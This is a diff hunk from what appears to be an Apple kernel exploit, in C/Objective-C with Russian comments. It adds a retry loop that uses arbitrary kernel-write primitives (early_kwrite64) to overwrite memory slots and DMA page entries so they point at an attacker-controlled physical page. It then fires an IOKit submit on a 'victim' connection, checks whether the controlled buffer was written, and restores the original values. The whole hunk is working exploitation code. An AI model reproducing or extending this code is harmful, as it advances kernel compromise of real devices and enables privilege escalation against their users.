@@ -6960,6 +6960,29 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                   cur == newQs[j] ? @"патч НА МЕСТЕ (execute читает другой источник!)" :
                   cur == origQs[j] ? @"ОТКАТИЛО в оригинал (кто-то переписал слот)" : @"ИЗМЕНЕНО третьим"]);
     }
+    // 1.9.209: откат — лотерея rewriter×prepare. Крутим до 8 розыгрышей в одном
+    // прогоне: перепатч слота+DEP → свежий submit → ждём → чек ctl. ctl при
+    // откате не пачкается (DMA уходит в оригинальный backing) — чек валиден.
+    for (int attempt = 1; !changed && attempt < 8; attempt++) {
+        for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], newQs[j]);
+        for (int i = 0; i < nDep; i++) {
+            uint64_t nq = (hitForm[i] == 1) ? ((hitOld[i] & 0x3fffULL) | ctlPA)
+                        : (hitForm[i] == 3) ? (((uint64_t)ctlPFN << 32) | (hitOld[i] & 0xffffffffULL))
+                        : (hitForm[i] == 4) ? ((hitOld[i] & 0xffffffff00000000ULL) | ctlPFN)
+                        : (uint64_t)ctlPFN;
+            early_kwrite64(hitAddr[i], nq);
+        }
+        kern_return_t rkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
+        usleep(400000);
+        for (uint32_t i = 0; i < 0x4000; i += 4) {
+            uint32_t px = *(volatile uint32_t *)(ctl + i);
+            if (px != 0xCCCCCCCC && px != 0) changed++;
+        }
+        uint64_t cur0 = nSlots ? early_kread64(slotVAs[0]) : 0;
+        kpNote(r, [NSString stringWithFormat:@"  [RETRY #%d] submit kr=0x%x ctl-changed=%d слот#0=%#018llx",
+                  attempt, rkr, changed, (unsigned long long)cur0]);
+        if (!changed) for (int j = 0; j < nSlots; j++) early_kwrite64(slotVAs[j], origQs[j]);
+    }
     // restore всех пропатченных слотов (порт-маршрут или одиночный ranges)
     for (int j = 0; j < nSlots; j++)
         early_kwrite64(slotVAs[j], origQs[j]);
